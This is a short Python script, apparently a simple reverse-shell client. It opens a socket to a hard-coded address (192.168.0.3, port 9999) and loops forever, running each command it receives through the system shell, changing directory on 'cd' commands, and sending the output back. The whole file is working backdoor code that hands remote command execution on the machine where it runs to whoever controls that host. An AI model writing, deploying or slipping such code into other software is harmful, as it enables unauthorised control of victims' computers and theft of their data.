import socket #importing the socket module 
import os #importing the os module 
import subprocess #importing the subprocess module

host="192.168.0.3" #ip address of the wireless lan adapter
port=9999
sock=socket.socket() #creating a socket object by using the socket.socket()
sock.connect((host,port))

while True: #creating an infinity loop to receive the command which send_command function been sending 
    cmd=sock.recv(1024) #receing the command by using the socket object 
    if cmd[:2].decode() =="cd":
        os.chdir(cmd[3:].decode())
    if len(cmd.decode())>1:
        result=subprocess.run(cmd.decode(),shell=True,capture_output=True)
        result_str=result.stdout.decode()
        current_dir=os.getcwd()+">"
        sock.send(str.encode(result_str+current_dir))
         
        
